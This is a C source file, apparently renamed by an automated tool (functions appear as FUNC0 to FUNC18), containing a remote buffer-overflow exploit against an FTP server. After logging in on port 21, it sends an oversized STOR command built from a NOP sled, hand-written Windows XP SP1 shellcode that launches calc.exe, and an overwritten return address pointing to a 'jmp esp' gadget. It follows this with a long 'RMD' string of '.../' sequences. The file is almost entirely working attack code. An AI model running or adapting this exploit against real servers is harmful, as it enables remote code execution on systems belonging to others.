#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  tmp ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  buf ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  int /*<<< orphan*/  WORD ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int,int) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (char*,int,char*,char*) ; 
 int FUNC4 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 char* FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (int) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int FUNC9 (int,char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC11 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC12 (char*,...) ; 
 int /*<<< orphan*/  FUNC13 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC14 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*) ; 
 int FUNC17 (char*) ; 

void FUNC18 (char *pack, char *user, char *pass)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int sock, err,x;
	struct sockaddr_in sin;
	char buf[2000],tmp[1000];
	

	char *shell=				// 5 min. XP SP1 shellcode
		"\x33\xc0"				// xor eax,eax
		"\x50"					// push eax (\0)
		"\x68\x2e\x65\x78\x65"  // push '.exe'
		"\x68\x63\x61\x6c\x63"  // push 'calc'
		"\x54"					// push esp
		"\xba\x44\x80\xc2\x77"  // mov  edx, 77c28044
		"\xff\xd2";				// call edx  (system)


	wVersionRequested = FUNC1( 2, 2 );
	err = FUNC2( wVersionRequested, &wsaData );
	if ( err != 0 ) {
		FUNC12 ("ERROR: Sorry, cannot create socket!!!\n");
		FUNC0(-1);
	}

	sock=FUNC14(AF_INET,SOCK_STREAM,0);
	

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr = FUNC8(pack);
	sin.sin_port = FUNC7(21);
	
	if (FUNC4(sock,(struct sockaddr*)&sin, sizeof(struct sockaddr)) == -1) {
		FUNC12 ("CONNECT :(((\n");
		FUNC0(-1);
	}

	if (FUNC9(sock,user,pass) == -1)
	{
		FUNC12 ("ERROR: Cannot login to FTP server, sorry!!!\n");
		FUNC5(-1);
	}
	
	FUNC11(tmp,0,sizeof(tmp));
	FUNC11 (tmp,0x90,180);


	FUNC10 (&tmp[80],shell,FUNC17(shell));
	*(long*)&tmp[158] = 0x77da52b8; // EIP -> ret into 'jmp esp'
	*(long*)&tmp[166] = 0x74ec8390; //		  sub esp,0x74
	*(long*)&tmp[170] = 0x9090e4ff; //		  jmp esp


	FUNC3 (buf,sizeof(buf),"STOR %s\r\n", tmp);

	FUNC12 ("DEBUG: %.30s %d\n",buf,FUNC17(buf));
	FUNC13 (sock,buf,FUNC17(buf),0);
	FUNC12 ("%s\n",FUNC6(sock));

	FUNC16(buf,"RMD ");
	for (x=0;x<276;x++)
		FUNC15 (buf,".../");
	FUNC15(buf,"\r\n");

	FUNC12 ("Sending exploit strings\n");
	FUNC13 (sock,buf,FUNC17(buf),0);
	FUNC12 ("recv: %s\n",FUNC6(sock));


}